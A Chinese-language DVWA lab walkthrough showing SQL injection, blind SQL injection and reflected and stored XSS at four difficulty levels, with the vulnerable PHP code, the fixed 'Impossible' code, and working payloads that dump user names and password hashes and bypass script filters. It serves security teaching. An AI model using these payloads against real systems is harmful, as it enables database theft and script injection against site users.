1.判断是否存在注入，注入是字符型还是数字型

2.猜解SQL查询语句中的字段数

3.确定显示的字段顺序

4.获取当前数据库

5.获取数据库中的表

6.获取表中的字段名

7.下载数据

下面对四种级别的代码进行分析。

Low
服务器端核心代码



```
<?php 

if( isset( $_REQUEST[ 'Submit' ] ) ) { 
    // Get input 
    $id = $_REQUEST[ 'id' ]; 

    // Check database 
    $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';"; 
    $result = mysql_query( $query ) or die( '<pre>' . mysql_error() . '</pre>' ); 

    // Get results 
    $num = mysql_numrows( $result ); 
    $i   = 0; 
    while( $i < $num ) { 
        // Get values 
        $first = mysql_result( $result, $i, "first_name" ); 
        $last  = mysql_result( $result, $i, "last_name" ); 

        // Feedback for end user 
        echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>"; 

        // Increase loop count 
        $i++; 
    } 

    mysql_close(); 
} 

?>
```

可以看到，Low级别的代码对来自客户端的参数id没有进行任何的检查与过滤，存在明显的SQL注入。

漏洞利用
现实攻击场景下，攻击者是无法看到后端代码的，所以下面的手工注入步骤是建立在无法看到源码的基础上。


1.判断是否存在注入，注入是字符型还是数字型
输入1，查询成功：

![image]({path}/39.png)



输入1’and ‘1’ =’2，查询失败，返回结果为空：

![image]({path}/40.png)

输入1’or ‘1234 ’=’1234，查询成功：

![image]({path}/41.png)

返回了多个结果，说明存在字符型注入。

2.猜解SQL查询语句中的字段数
输入1′ or 1=1 order by 1 #，查询成功：

![image]({path}/42.png)

输入1′ or 1=1 order by 2 #，查询成功：

![image]({path}/43.png)

输入1′ or 1=1 order by 3 #，查询失败：

![image]({path}/44.png)

说明执行的SQL查询语句中只有两个字段，即这里的First name、Surname。

（这里也可以通过输入union select 1,2,3…来猜解字段数）

3.确定显示的字段顺序
输入1′ union select 1,2 #，查询成功：

![image]({path}/45.png)

说明执行的SQL语句为select First name,Surname from 表 where ID=’id’…

4.获取当前数据库
输入1′ union select 1,database() #，查询成功：

![image]({path}/46.png)

说明当前的数据库为dvwa。

5.获取数据库中的表
输入1′ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #，查询成功：

![image]({path}/47.png)

说明数据库dvwa中一共有两个表，guestbook与users。

6.获取表中的字段名
输入1′ union select 1,group_concat(column_name) from information_schema.columns where table_name=’users’ #，查询成功：

![image]({path}/48.png)

说明users表中有8个字段，分别是user_id,first_name,last_name,user,password,avatar,last_login,failed_login。

7.下载数据
输入1′ or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #，查询成功：

![image]({path}/49.png)

这样就得到了users表中所有用户的user_id,first_name,last_name,password的数据。

### Medium
服务器端核心代码


```
<?php 

if( isset( $_POST[ 'Submit' ] ) ) { 
    // Get input 
    $id = $_POST[ 'id' ]; 
    $id = mysql_real_escape_string( $id ); 

    // Check database 
    $query  = "SELECT first_name, last_name FROM users WHERE user_id = $id;"; 
    $result = mysql_query( $query ) or die( '<pre>' . mysql_error() . '</pre>' ); 

    // Get results 
    $num = mysql_numrows( $result ); 
    $i   = 0; 
    while( $i < $num ) { 
        // Display values 
        $first = mysql_result( $result, $i, "first_name" ); 
        $last  = mysql_result( $result, $i, "last_name" ); 

        // Feedback for end user 
        echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>"; 

        // Increase loop count 
        $i++; 
    } 

    //mysql_close(); 
} 

?>
```

可以看到，Medium级别的代码利用mysql_real_escape_string函数对特殊符号

\x00,\n,\r,\,’,”,\x1a进行转义，同时前端页面设置了下拉选择表单，希望以此来控制用户的输入。

![image]({path}/38.png)

**漏洞利用**
虽然前端使用了下拉选择菜单，但我们依然可以通过抓包改参数，提交恶意构造的查询参数。

1.判断是否存在注入，注入是字符型还是数字型
抓包更改参数id为1′ or 1=1 #

![image]({path}/50.png)




抓包更改参数id为1 or 1=1 #，查询成功：

![image]({path}/51.png)

说明存在数字型注入。

（由于是数字型注入，服务器端的mysql_real_escape_string函数就形同虚设了，因为数字型注入并不需要借助引号。）

2.猜解SQL查询语句中的字段数
抓包更改参数id为1 order by 2 #，查询成功：

![image]({path}/52.png)

抓包更改参数id为1 order by 3 #，报错：

![image]({path}/53.png)

说明执行的SQL查询语句中只有两个字段，即这里的First name、Surname。

3.确定显示的字段顺序
抓包更改参数id为1 union select 1,2 #，查询成功：

![image]({path}/54.png)

说明执行的SQL语句为select First name,Surname from 表 where ID=id…

4.获取当前数据库
抓包更改参数id为1 union select 1,database() #，查询成功：

![image]({path}/55.png)

说明当前的数据库为dvwa。

5.获取数据库中的表
抓包更改参数id为1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #，查询成功：

![image]({path}/56.png)

说明数据库dvwa中一共有两个表，guestbook与users。

6.获取表中的字段名
抓包更改参数id为1 union select 1,group_concat(column_name) from information_schema.columns where table_name=’users ’#，查询失败：

![image]({path}/57.png)

这是因为单引号被转义了，变成了\’。

可以利用16进制进行绕过，抓包更改参数id为1 union select 1,group_concat(column_name) from information_schema.columns where table_name=0×7573657273 #，查询成功：

![image]({path}/58.png)

说明users表中有8个字段，分别是user_id,first_name,last_name,user,password,avatar,last_login,failed_login。

7.下载数据
抓包修改参数id为1 or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #，查询成功：

![image]({path}/59.png)

这样就得到了users表中所有用户的user_id,first_name,last_name,password的数据。

### High
服务器端核心代码


```
<?php 

if( isset( $_SESSION [ 'id' ] ) ) { 
    // Get input 
    $id = $_SESSION[ 'id' ]; 

    // Check database 
    $query  = "SELECT first_name, last_name FROM users WHERE user_id = $id LIMIT 1;"; 
    $result = mysql_query( $query ) or die( '<pre>Something went wrong.</pre>' ); 

    // Get results 
    $num = mysql_numrows( $result ); 
    $i   = 0; 
    while( $i < $num ) { 
        // Get values 
        $first = mysql_result( $result, $i, "first_name" ); 
        $last  = mysql_result( $result, $i, "last_name" ); 

        // Feedback for end user 
        echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>"; 

        // Increase loop count 
        $i++; 
    } 

    mysql_close(); 
} 

?>
```

可以看到，与Medium级别的代码相比，High级别的只是在SQL查询语句中添加了LIMIT 1，希望以此控制只输出一个结果。

漏洞利用
虽然添加了LIMIT 1，但是我们可以通过#将其注释掉。由于手工注入的过程与Low级别基本一样，直接最后一步演示下载数据。

输入1 or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #，查询成功：

![image]({path}/60.png)

需要特别提到的是，High级别的查询提交页面与查询结果显示页面不是同一个，也没有执行302跳转，这样做的目的是为了防止一般的sqlmap注入，因为sqlmap在注入过程中，无法在查询提交页面上获取查询的结果，没有了反馈，也就没办法进一步注入。



### Impossible
服务器端核心代码



```
<?php 

if( isset( $_GET[ 'Submit' ] ) ) { 
    // Check Anti-CSRF token 
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); 

    // Get input 
    $id = $_GET[ 'id' ]; 

    // Was a number entered? 
    if(is_numeric( $id )) { 
        // Check the database 
        $data = $db->prepare( 'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;' ); 
        $data->bindParam( ':id', $id, PDO::PARAM_INT ); 
        $data->execute(); 
        $row = $data->fetch(); 

        // Make sure only 1 result is returned 
        if( $data->rowCount() == 1 ) { 
            // Get values 
            $first = $row[ 'first_name' ]; 
            $last  = $row[ 'last_name' ]; 

            // Feedback for end user 
            echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>"; 
        } 
    } 
} 

// Generate Anti-CSRF token 
generateSessionToken(); 

?>
```

可以看到，Impossible级别的代码采用了PDO技术，划清了代码与数据的界限，有效防御SQL注入，同时只有返回的查询结果数量为一时，才会成功输出，这样就有效预防了“脱裤”，Anti-CSRFtoken机制的加入了进一步提高了安全性。

## SQL Injection(Blind)
SQL Injection（Blind），即SQL盲注，与一般注入的区别在于，一般的注入攻击者可以直接从页面上看到注入语句的执行结果，而盲注时攻击者通常是无法从显示页面上获取执行结果，甚至连注入语句是否执行都无从得知，因此盲注的难度要比一般注入高。目前网络上现存的SQL注入漏洞大多是SQL盲注。

手工盲注思路
手工盲注的过程，就像你与一个机器人聊天，这个机器人知道的很多，但只会回答“是”或者“不是”，因此你需要询问它这样的问题，例如“数据库名字的第一个字母是不是a啊？”，通过这种机械的询问，最终获得你想要的数据。

盲注分为基于布尔的盲注、基于时间的盲注以及基于报错的盲注，这里由于实验环境的限制，只演示基于布尔的盲注与基于时间的盲注。

下面简要介绍手工盲注的步骤（可与之前的手工注入作比较）：

1.判断是否存在注入，注入是字符型还是数字型

2.猜解当前数据库名

3.猜解数据库中的表名

4.猜解表中的字段名

5.猜解数据

下面对四种级别的代码进行分析。

### Low
服务器端核心代码



```
<?php 

if( isset( $_GET[ 'Submit' ] ) ) { 
    // Get input 
    $id = $_GET[ 'id' ]; 

    // Check database 
    $getid  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';"; 
    $result = mysql_query( $getid ); // Removed 'or die' to suppress mysql errors 

    // Get results 
    $num = @mysql_numrows( $result ); // The '@' character suppresses errors 
    if( $num > 0 ) { 
        // Feedback for end user 
        echo '<pre>User ID exists in the database.</pre>'; 
    } 
    else { 
        // User wasn't found, so the page wasn't! 
        header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' ); 

        // Feedback for end user 
        echo '<pre>User ID is MISSING from the database.</pre>'; 
    } 

    mysql_close(); 
} 

?>
```

可以看到，Low级别的代码对参数id没有做任何检查、过滤，存在明显的SQL注入漏洞，同时SQL语句查询返回的结果只有两种，User ID exists in the database.与User ID is MISSING from the database.，因此这里是SQL盲注漏洞。

**漏洞利用**
首先演示基于布尔的盲注：

1.判断是否存在注入，注入是字符型还是数字型
输入1，显示相应用户存在：

![image]({path}/61.png)

输入1’ and 1=1 #，显示存在：

![image]({path}/62.png)

输入1’ and '1'='2' #，显示不存在：

![image]({path}/63.png)

说明存在字符型的SQL盲注。

2.猜解当前数据库名
想要猜解数据库名，首先要猜解数据库名的长度，然后挨个猜解字符。


```
输入1’ and length(database())=1 #，显示不存在；

输入1’ and length(database())=2 #，显示不存在；

输入1’ and length(database())=3 #，显示不存在；

输入1’ and length(database())=4 #，显示存在：
```



说明数据库名长度为4。

下面采用二分法猜解数据库名。


```
输入1’ and ascii(substr(databse(),1,1))>97 #，显示存在，说明数据库名的第一个字符的ascii值大于97（小写字母a的ascii值）；

输入1’ and ascii(substr(databse(),1,1))<122 #，显示存在，说明数据库名的第一个字符的ascii值小于122（小写字母z的ascii值）；

输入1’ and ascii(substr(databse(),1,1))<109 #，显示存在，说明数据库名的第一个字符的ascii值小于109（小写字母m的ascii值）；

输入1’ and ascii(substr(databse(),1,1))<103 #，显示存在，说明数据库名的第一个字符的ascii值小于103（小写字母g的ascii值）；

输入1’ and ascii(substr(databse(),1,1))<100 #，显示不存在，说明数据库名的第一个字符的ascii值不小于100（小写字母d的ascii值）；

输入1’ and ascii(substr(databse(),1,1))>100 #，显示不存在，说明数据库名的第一个字符的ascii值不大于100（小写字母d的ascii值），所以数据库名的第一个字符的ascii值为100，即小写字母d。

…
```


重复上述步骤，就可以猜解出完整的数据库名（dvwa）了。

3.猜解数据库中的表名
首先猜解数据库中表的数量：


```
1’ and (select count (table_name) from information_schema.tables where table_schema=database())=1 # 显示不存在

1’ and (select count (table_name) from information_schema.tables where table_schema=database() )=2 # 显示存在
```


说明数据库中共有两个表。

接着挨个猜解表名：


```
1’ and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=1 # 显示不存在

1’ and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=2 # 显示不存在

…

1’ and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 # 显示存在
```


说明第一个表名长度为9。


```
1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>97 # 显示存在

1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))<122 # 显示存在

1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))<109 # 显示存在

1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))<103 # 显示不存在

1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>103 # 显示不存在
```



说明第一个表的名字的第一个字符为小写字母g。

…

重复上述步骤，即可猜解出两个表名（guestbook、users）。

4.猜解表中的字段名
首先猜解表中字段的数量：


```
1’ and (select count(column_name) from information_schema.columns where table_name= ’users’)=1 # 显示不存在

…

1’ and (select count(column_name) from information_schema.columns where table_name= ’users’)=8 # 显示存在
```


说明users表有8个字段。

接着挨个猜解字段名：


```
1’ and length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=1 # 显示不存在

…

1’ and length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=7 # 显示存在
```


说明users表的第一个字段为7个字符长度。

采用二分法，即可猜解出所有字段名。

5.猜解数据
同样采用二分法。

还可以使用基于时间的盲注：

1.判断是否存在注入，注入是字符型还是数字型

```
输入1’ and sleep(5) #，感觉到明显延迟；

输入1 and sleep(5) #，没有延迟；
```


说明存在字符型的基于时间的盲注。

2.猜解当前数据库名
首先猜解数据名的长度：


```
1’ and if(length(database())=1,sleep(5),1) # 没有延迟

1’ and if(length(database())=2,sleep(5),1) # 没有延迟

1’ and if(length(database())=3,sleep(5),1) # 没有延迟

1’ and if(length(database())=4,sleep(5),1) # 明显延迟
```


说明数据库名长度为4个字符。

接着采用二分法猜解数据库名：


```
1’ and if(ascii(substr(database(),1,1))>97,sleep(5),1)# 明显延迟

…

1’ and if(ascii(substr(database(),1,1))<100,sleep(5),1)# 没有延迟

1’ and if(ascii(substr(database(),1,1))>100,sleep(5),1)# 没有延迟
```


说明数据库名的第一个字符为小写字母d。

…

重复上述步骤，即可猜解出数据库名。

3.猜解数据库中的表名
首先猜解数据库中表的数量：


```
1’ and if((select count(table_name) from information_schema.tables where table_schema=database() )=1,sleep(5),1)# 没有延迟

1’ and if((select count(table_name) from information_schema.tables where table_schema=database() )=2,sleep(5),1)# 明显延迟
```


说明数据库中有两个表。

接着挨个猜解表名：


```
1’ and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=1,sleep(5),1) # 没有延迟

…

1’ and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9,sleep(5),1) # 明显延迟
```


说明第一个表名的长度为9个字符。

采用二分法即可猜解出表名。

4.猜解表中的字段名
首先猜解表中字段的数量：


```
1’ and if((select count(column_name) from information_schema.columns where table_name= ’users’)=1,sleep(5),1)# 没有延迟

…

1’ and if((select count(column_name) from information_schema.columns where table_name= ’users’)=8,sleep(5),1)# 明显延迟
```


说明users表中有8个字段。

接着挨个猜解字段名：


```
1’ and if(length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=1,sleep(5),1) # 没有延迟

…

1’ and if(length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=7,sleep(5),1) # 明显延迟
```


说明users表的第一个字段长度为7个字符。

采用二分法即可猜解出各个字段名。

5.猜解数据
同样采用二分法。

### Medium
服务器端核心代码 


```
<?php 

if( isset( $_POST[ 'Submit' ]  ) ) { 
    // Get input 
    $id = $_POST[ 'id' ]; 
    $id = mysql_real_escape_string( $id ); 

    // Check database 
    $getid  = "SELECT first_name, last_name FROM users WHERE user_id = $id;"; 
    $result = mysql_query( $getid ); // Removed 'or die' to suppress mysql errors 

    // Get results 
    $num = @mysql_numrows( $result ); // The '@' character suppresses errors 
    if( $num > 0 ) { 
        // Feedback for end user 
        echo '<pre>User ID exists in the database.</pre>'; 
    } 
    else { 
        // Feedback for end user 
        echo '<pre>User ID is MISSING from the database.</pre>'; 
    } 

    //mysql_close(); 
} 

?>
```

可以看到，Medium级别的代码利用mysql_real_escape_string函数对特殊符号

\x00,\n,\r,\,’,”,\x1a进行转义，同时前端页面设置了下拉选择表单，希望以此来控制用户的输入。

![image]({path}/64.png)

漏洞利用
虽然前端使用了下拉选择菜单，但我们依然可以通过抓包改参数id，提交恶意构造的查询参数。

之前已经介绍了详细的盲注流程，这里就简要演示几个。

首先是基于布尔的盲注：


```
抓包改参数id为1 and length(database())=4 #，显示存在，说明数据库名的长度为4个字符；

抓包改参数id为1 and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 #，显示存在，说明数据中的第一个表名长度为9个字符；

抓包改参数id为1 and (select count(column_name) from information_schema.columns where table_name= 0×7573657273)=8 #，（0×7573657273为users的16进制），显示存在，说明uers表有8个字段。

然后是基于时间的盲注：

抓包改参数id为1 and if(length(database())=4,sleep(5),1) #，明显延迟，说明数据库名的长度为4个字符；

抓包改参数id为1 and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9,sleep(5),1) #，明显延迟，说明数据中的第一个表名长度为9个字符；

抓包改参数id为1 and if((select count(column_name) from information_schema.columns where table_name=0×7573657273 )=8,sleep(5),1) #，明显延迟，说明uers表有8个字段。
```


### High
服务器端核心代码



```
<?php 

if( isset( $_COOKIE[ 'id' ] ) ) { 
    // Get input 
    $id = $_COOKIE[ 'id' ]; 

    // Check database 
    $getid  = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;"; 
    $result = mysql_query( $getid ); // Removed 'or die' to suppress mysql errors 

    // Get results 
    $num = @mysql_numrows( $result ); // The '@' character suppresses errors 
    if( $num > 0 ) { 
        // Feedback for end user 
        echo '<pre>User ID exists in the database.</pre>'; 
    } 
    else { 
        // Might sleep a random amount 
        if( rand( 0, 5 ) == 3 ) { 
            sleep( rand( 2, 4 ) ); 
        } 

        // User wasn't found, so the page wasn't! 
        header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' ); 

        // Feedback for end user 
        echo '<pre>User ID is MISSING from the database.</pre>'; 
    } 

    mysql_close(); 
} 

?>
```

可以看到，High级别的代码利用cookie传递参数id，当SQL查询结果为空时，会执行函数sleep(seconds)，目的是为了扰乱基于时间的盲注。同时在 SQL查询语句中添加了LIMIT 1，希望以此控制只输出一个结果。

**漏洞利用**
虽然添加了LIMIT 1，但是我们可以通过#将其注释掉。但由于服务器端执行sleep函数，会使得基于时间盲注的准确性受到影响，这里我们只演示基于布尔的盲注：


```
抓包将cookie中参数id改为1’ and length(database())=4 #，显示存在，说明数据库名的长度为4个字符；

抓包将cookie中参数id改为1’ and length(substr(( select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 #，显示存在，说明数据中的第一个表名长度为9个字符；

抓包将cookie中参数id改为1’ and (select count(column_name) from information_schema.columns where table_name=0×7573657273)=8 #，（0×7573657273 为users的16进制），显示存在，说明uers表有8个字段。
```


### Impossible
服务器端核心代码


```
<?php 

if( isset( $_GET[ 'Submit' ] ) ) { 
    // Check Anti-CSRF token 
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); 

    // Get input 
    $id = $_GET[ 'id' ]; 

    // Was a number entered? 
    if(is_numeric( $id )) { 
        // Check the database 
        $data = $db->prepare( 'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;' ); 
        $data->bindParam( ':id', $id, PDO::PARAM_INT ); 
        $data->execute(); 

        // Get results 
        if( $data->rowCount() == 1 ) { 
            // Feedback for end user 
            echo '<pre>User ID exists in the database.</pre>'; 
        } 
        else { 
            // User wasn't found, so the page wasn't! 
            header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' ); 

            // Feedback for end user 
            echo '<pre>User ID is MISSING from the database.</pre>'; 
        } 
    } 
} 

// Generate Anti-CSRF token 
generateSessionToken(); 

?>
```

可以看到，Impossible级别的代码采用了PDO技术，划清了代码与数据的界限，有效防御SQL注入，Anti-CSRF token机制的加入了进一步提高了安全性。



## XSS
XSS，全称Cross Site Scripting，即跨站脚本攻击，某种意义上也是一种注入攻击，是指攻击者在页面中注入恶意的脚本代码，当受害者访问该页面时，恶意代码会在其浏览器上执行，需要强调的是，XSS不仅仅限于JavaScript，还包括flash等其它脚本语言。根据恶意代码是否存储在服务器中，XSS可以分为存储型的XSS与反射型的XSS。

DOM型的XSS由于其特殊性，常常被分为第三种，这是一种基于DOM树的XSS。例如服务器端经常使用document.boby.innerHtml等函数动态生成html页面，如果这些函数在引用某些变量时没有进行过滤或检查，就会产生DOM型的XSS。DOM型XSS可能是存储型，也有可能是反射型。

反射型XSS
下面对四种级别的代码进行分析。

Low
服务器端核心代码


```
<?php 

// Is there any input? 

if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) { 

    // Feedback for end user 

    echo '<pre>Hello ' . $_GET[ 'name' ] . '</pre>'; 

} 

?>
```


可以看到，代码直接引用了name参数，并没有任何的过滤与检查，存在明显的XSS漏洞。

漏洞利用

输入

```
<script>alert(/xss/)</script>
```

成功弹框：

![image]({path}/65.png)

相应的XSS链接：


```
http://192.168.1.210:9999/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%280%29%3C%2Fscript%3E#
```


### Medium
服务器端核心代码
```
<?php 


// Is there any input? 
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) { 
    // Get input 
    $name = str_replace( '<script>', '', $_GET[ 'name' ] ); 
    // Feedback for end user 
    echo "<pre>Hello ${name}</pre>"; 
} 
?>
```

可以看到，这里对输入进行了过滤，基于黑名单的思想，使用str_replace函数将输入中的<script>删除，这种防护机制是可以被轻松绕过的。

漏洞利用

1.双写绕过

输入

```
<sc<script>ript>alert(/xss/)</script>
```

成功弹框：

![image]({path}/66.png)

相应的XSS链接：


```
http://192.168.1.210:9999/vulnerabilities/xss_r/?name=%3Csc%3Cscript%3Eript%3Ealert%28%2Fxss%2F%29%3C%2Fscript%3E#
```

2.大小写混淆绕过

输入

```
<ScRipt>alert(/xss/)</script>
```

成功弹框：

![image]({path}/67.png)

相应的XSS链接：


```
http://192.168.1.210:9999/vulnerabilities/xss_r/?name=%3CScRipt%3Ealert%28%2Fxss%2F%29%3C%2Fscript%3E#
```


### High
服务器端核心代码


```
<?php 
// Is there any input? 
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) { 
    // Get input 
    $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] ); 
    // Feedback for end user 
    echo "<pre>Hello ${name}</pre>"; 
} 
?>
```

可以看到，High级别的代码同样使用黑名单过滤输入，preg_replace() 函数用于正则表达式的搜索和替换，这使得双写绕过、大小写混淆绕过（正则表达式中i表示不区分大小写）不再有效。

漏洞利用

虽然无法使用<script>标签注入XSS代码，但是可以通过img、body等标签的事件或者iframe等标签的src注入恶意的js代码。

输入<img src=1 onerror=alert(/xss/)>，成功弹框：

![image]({path}/68.png)

相应的XSS链接：


```
http://192.168.1.210:9999/vulnerabilities/xss_r/?name=%3Cimg+src%3D1+onerror%3Dalert%28%2Fxss%2F%29%3E#
```


### Impossible
服务器端核心代码


```
<?php 
// Is there any input? 
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) { 
    // Check Anti-CSRF token 
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); 
    // Get input 
    $name = htmlspecialchars( $_GET[ 'name' ] ); 
    // Feedback for end user 
    echo "<pre>Hello ${name}</pre>"; 
} 
// Generate Anti-CSRF token 
generateSessionToken(); 
?>
```

可以看到，Impossible级别的代码使用htmlspecialchars函数把预定义的字符&、”、 ’、<、>转换为 HTML 实体，防止浏览器将其作为HTML元素。

**存储型XSS**

下面对四种级别的代码进行分析。

### Low
服务器端核心代码


```
<?php 
if( isset( $_POST[ 'btnSign' ] ) ) { 
    // Get input 
    $message = trim( $_POST[ 'mtxMessage' ] ); 
    $name    = trim( $_POST[ 'txtName' ] ); 
    // Sanitize message input 
    $message = stripslashes( $message ); 
    $message = mysql_real_escape_string( $message ); 
    // Sanitize name input 
    $name = mysql_real_escape_string( $name ); 
    // Update database 
    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );"; 
    $result = mysql_query( $query ) or die( '<pre>' . mysql_error() . '</pre>' ); 
    //mysql_close(); 
} 
?>
```

相关函数介绍

trim(string,charlist)

函数移除字符串两侧的空白字符或其他预定义字符，预定义字符包括、\t、\n、\x0B、\r以及空格，可选参数charlist支持添加额外需要删除的字符。

mysql_real_escape_string(string,connection)

函数会对字符串中的特殊符号（\x00，\n，\r，\，‘，“，\x1a）进行转义。

stripslashes(string)

函数删除字符串中的反斜杠。

可以看到，对输入并没有做XSS方面的过滤与检查，且存储在数据库中，因此这里存在明显的存储型XSS漏洞。

漏洞利用

message一栏输入

```
<script>alert(/xss/)</script>
```

成功弹框：

![image]({path}/69.png)

![image]({path}/70.png)


### Medium
服务器端核心代码


```
<?php 
if( isset( $_POST[ 'btnSign' ] ) ) { 
    // Get input 
    $message = trim( $_POST[ 'mtxMessage' ] ); 
    $name    = trim( $_POST[ 'txtName' ] ); 
    // Sanitize message input 
    $message = strip_tags( addslashes( $message ) ); 
    $message = mysql_real_escape_string( $message ); 
    $message = htmlspecialchars( $message ); 
    // Sanitize name input 
    $name = str_replace( '<script>', '', $name ); 
    $name = mysql_real_escape_string( $name ); 
    // Update database 
    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );"; 
    $result = mysql_query( $query ) or die( '<pre>' . mysql_error() . '</pre>' ); 
    //mysql_close(); 
} 
?>
```

相关函数说明

strip_tags() 函数剥去字符串中的 HTML、XML 以及 PHP 的标签，但允许使用<b>标签。

addslashes() 函数返回在预定义字符（单引号、双引号、反斜杠、NULL）之前添加反斜杠的字符串。

可以看到，由于对message参数使用了htmlspecialchars函数进行编码，因此无法再通过message参数注入XSS代码，但是对于name参数，只是简单过滤了<script>字符串，仍然存在存储型的XSS。

漏洞利用

1.双写绕过
F12修改name参数的长度，输入

```
<sc<script>ript>alert(/xss/)</script>
```

成功弹框：

![image]({path}/71.png)
![image]({path}/72.png)

2.大小写混淆绕过

F12修改name参数的长度，输入<Script>alert(/xss/)</script>:

![image]({path}/73.png)
![image]({path}/74.png)


### High
服务器端核心代码


```
<?php 
if( isset( $_POST[ 'btnSign' ] ) ) { 
    // Get input 
    $message = trim( $_POST[ 'mtxMessage' ] ); 
    $name    = trim( $_POST[ 'txtName' ] ); 
    // Sanitize message input 
    $message = strip_tags( addslashes( $message ) ); 
    $message = mysql_real_escape_string( $message ); 
    $message = htmlspecialchars( $message ); 
    // Sanitize name input 
    $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $name ); 
    $name = mysql_real_escape_string( $name ); 
    // Update database 
    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );"; 
    $result = mysql_query( $query ) or die( '<pre>' . mysql_error() . '</pre>' ); 
    //mysql_close(); 
} 
?>
```

可以看到，这里使用正则表达式过滤了<script>标签，但是却忽略了img、iframe等其它危险的标签，因此name参数依旧存在存储型XSS。

F12修改name参数的长度，输入<img src=1 onerror=alert(1)>：

![image]({path}/75.png)
![image]({path}/76.png)
### Impossible
服务器端核心代码


```
<?php 
if( isset( $_POST[ 'btnSign' ] ) ) { 
    // Check Anti-CSRF token 
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); 
    // Get input 
    $message = trim( $_POST[ 'mtxMessage' ] ); 
    $name    = trim( $_POST[ 'txtName' ] ); 
    // Sanitize message input 
    $message = stripslashes( $message ); 
    $message = mysql_real_escape_string( $message ); 
    $message = htmlspecialchars( $message ); 
    // Sanitize name input 
    $name = stripslashes( $name ); 
    $name = mysql_real_escape_string( $name ); 
    $name = htmlspecialchars( $name ); 
    // Update database 
    $data = $db->prepare( 'INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );' ); 
    $data->bindParam( ':message', $message, PDO::PARAM_STR ); 
    $data->bindParam( ':name', $name, PDO::PARAM_STR ); 
    $data->execute(); 
} 
// Generate Anti-CSRF token 
generateSessionToken(); 
?>
```

可以看到，通过使用htmlspecialchars函数，解决了XSS，但是要注意的是，如果htmlspecialchars函数使用不当，攻击者就可以通过编码的方式绕过函数进行XSS注入，尤其是DOM型的XSS。